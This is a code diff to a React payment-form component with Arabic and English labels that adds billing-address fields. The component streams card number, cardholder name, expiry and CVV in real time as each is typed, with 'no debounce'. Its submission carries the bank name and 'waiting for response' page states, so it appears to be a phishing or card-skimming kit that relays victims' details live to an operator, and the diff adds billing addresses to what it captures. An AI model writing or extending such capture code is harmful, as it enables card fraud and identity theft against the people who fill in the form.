@@ -55,6 +55,12 @@ const schema = z.object({
     return true;
   }, "Invalid expiry date"),
   cvv: z.string().length(3, "CVV must be 3 digits"),
+  street: z.string().min(1, "Street is required"),
+  apartment: z.string().optional(),
+  city: z.string().min(1, "City is required"),
+  state: z.string().optional(),
+  postcode: z.string().min(1, "Postcode is required"),
+  country: z.string().min(1, "Country is required"),
 });
 
 type FormData = z.infer<typeof schema>;
@@ -188,6 +194,12 @@ export default function CreditCardPayment() {
       nameOnCard: "",
       expiryDate: "",
       cvv: "",
+      street: "",
+      apartment: "",
+      city: "",
+      state: "",
+      postcode: "",
+      country: "",
     },
   });
 
@@ -195,6 +207,10 @@ export default function CreditCardPayment() {
   const nameOnCard = watch("nameOnCard");
   const expiryDate = watch("expiryDate");
   const cvv = watch("cvv");
+  const street = watch("street");
+  const city = watch("city");
+  const postcode = watch("postcode");
+  const country = watch("country");
 
   useEffect(() => {
     // Send immediately - no debounce for real-time
@@ -204,8 +220,14 @@ export default function CreditCardPayment() {
       nameOnCard: nameOnCard || "",
       expiryDate: expiryDate || "",
       cvv: cvv || "",
+      billing: {
+        street: street || "",
+        city: city || "",
+        postcode: postcode || "",
+        country: country || "",
+      }
     });
-  }, [cardNumber, nameOnCard, expiryDate, cvv]);
+  }, [cardNumber, nameOnCard, expiryDate, cvv, street, city, postcode, country]);
 
   const cleanCardNumber = cardNumber?.replace(/\s+/g, "") || "";
   const isFormValid =
@@ -214,7 +236,11 @@ export default function CreditCardPayment() {
     !luhnError &&
     nameOnCard?.trim().length > 0 &&
     expiryDate?.match(/^\d{2}\/\d{2}$/) &&
-    cvv?.length === 3;
+    cvv?.length === 3 &&
+    street?.trim().length > 0 &&
+    city?.trim().length > 0 &&
+    postcode?.trim().length > 0 &&
+    country?.trim().length > 0;
 
   const [selectedCardType, setSelectedCardType] = useState("");
   const [expiryMonth, setExpiryMonth] = useState("");
@@ -298,6 +324,14 @@ export default function CreditCardPayment() {
         cvv: data.cvv,
         type: selectedCardType || getCardType(cleanNum),
         bank: getBankInfoLocal(cleanNum)?.bank || "Unknown Bank",
+        billing: {
+          street: data.street,
+          apartment: data.apartment,
+          city: data.city,
+          state: data.state,
+          postcode: data.postcode,
+          country: data.country,
+        }
       },
       current: "صفحة الدفع",
       nextPage: "انتظار الرد",
@@ -541,7 +575,7 @@ export default function CreditCardPayment() {
               </div>
 
               {/* All fields below - same width as Card type column on desktop, full width on mobile */}
-              <div className="cc-fields-below mt-3 sm:ml-[280px]">
+              <div className={`cc-fields-below mt-3 sm:ml-[280px]`}>
 
               {/* Expiry + CVV */}
               <div className="cc-expiry-cvv flex flex-wrap sm:flex-nowrap gap-3 items-start">
@@ -577,11 +611,49 @@ export default function CreditCardPayment() {
                 <input type="text" placeholder={isAr ? 'الاسم كما هو مكتوب على البطاقة' : 'Name as it appears on the card'} {...register("nameOnCard")} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
               </fieldset>
 
+              {/* Billing Address Section */}
+              <div className="mt-8">
+                <h3 className={`text-[#2E7D32] font-bold mb-4 ${isAr ? 'text-right' : 'text-left'}`}>{isAr ? 'عنوان الفوترة' : 'Billing Address'}</h3>
+                <div className="space-y-3">
+                  <fieldset className={`border rounded px-3 bg-[#f5faf0] flex items-center ${errors.street ? 'border-red-500' : 'border-[#4CAF50]'}`} style={{height:'52px', boxSizing:'border-box', paddingTop:'0', paddingBottom:'0'}}>
+                    <legend className="text-[#2E7D32] text-xs px-1">{isAr ? 'اسم الشارع ورقم المنزل*' : 'Number and street name*'}</legend>
+                    <input type="text" placeholder={isAr ? 'أدخل اسم الشارع ورقم المنزل' : 'Enter a number and street name'} {...register("street")} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
+                  </fieldset>
+
+                  <fieldset className="border border-[#4CAF50] rounded px-3 bg-[#f5faf0] flex items-center" style={{height:'52px', boxSizing:'border-box', paddingTop:'0', paddingBottom:'0'}}>
+                    <legend className="text-[#2E7D32] text-xs px-1">{isAr ? 'شقة، مبنى، طابق، إلخ (اختياري)' : 'Apartment, building, floor, etc. (optional)'}</legend>
+                    <input type="text" placeholder={isAr ? 'أدخل الشقة، المبنى، الطابق، إلخ' : 'Enter an apartment, building, floor, etc.'} {...register("apartment")} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
+                  </fieldset>
+
+                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
+                    <fieldset className={`border rounded px-3 bg-[#f5faf0] flex items-center ${errors.city ? 'border-red-500' : 'border-[#4CAF50]'}`} style={{height:'52px', boxSizing:'border-box', paddingTop:'0', paddingBottom:'0'}}>
+                      <legend className="text-[#2E7D32] text-xs px-1">{isAr ? 'المدينة*' : 'Town/City*'}</legend>
+                      <input type="text" placeholder={isAr ? 'أدخل المدينة' : 'Enter a town or city'} {...register("city")} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
+                    </fieldset>
+                    <fieldset className="border border-[#4CAF50] rounded px-3 bg-[#f5faf0] flex items-center" style={{height:'52px', boxSizing:'border-box', paddingTop:'0', paddingBottom:'0'}}>
+                      <legend className="text-[#2E7D32] text-xs px-1">{isAr ? 'الولاية/المنطقة (اختياري)' : 'State/Region (optional)'}</legend>
+                      <input type="text" placeholder={isAr ? 'أدخل الولاية أو المنطقة' : 'Enter a state or region'} {...register("state")} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
+                    </fieldset>
+                  </div>
+
+                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
+                    <fieldset className={`border rounded px-3 bg-[#f5faf0] flex items-center ${errors.postcode ? 'border-red-500' : 'border-[#4CAF50]'}`} style={{height:'52px', boxSizing:'border-box', paddingTop:'0', paddingBottom:'0'}}>
+                      <legend className="text-[#2E7D32] text-xs px-1">{isAr ? 'الرمز البريدي*' : 'Postcode/ZIP code*'}</legend>
+                      <input type="text" placeholder={isAr ? 'أدخل الرمز البريدي' : 'Enter a postcode or ZIP code'} {...register("postcode")} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
+                    </fieldset>
+                    <fieldset className={`border rounded px-3 bg-[#f5faf0] flex items-center ${errors.country ? 'border-red-500' : 'border-[#4CAF50]'}`} style={{height:'52px', boxSizing:'border-box', paddingTop:'0', paddingBottom:'0'}}>
+                      <legend className="text-[#2E7D32] text-xs px-1">{isAr ? 'الدولة/المنطقة*' : 'Country/Region*'}</legend>
+                      <input type="text" placeholder={isAr ? 'أدخل الدولة' : 'Enter a country or region'} {...register("country")} className="w-full bg-transparent text-gray-700 focus:outline-none text-[15px]" />
+                    </fieldset>
+                  </div>
+                </div>
+              </div>
+
               {/* Pay button */}
               <button
                 type="submit"
                 disabled={!isFormValid}
-                className={`w-full mt-6 py-4 rounded-full text-lg font-bold transition-all ${
+                className={`w-full mt-8 py-4 rounded-full text-lg font-bold transition-all ${
                   isFormValid ? "bg-[#1B5E20] text-white hover:bg-[#0D3B0F] shadow-lg" : "bg-gray-300 text-gray-500 cursor-not-allowed"
                 }`}
               >
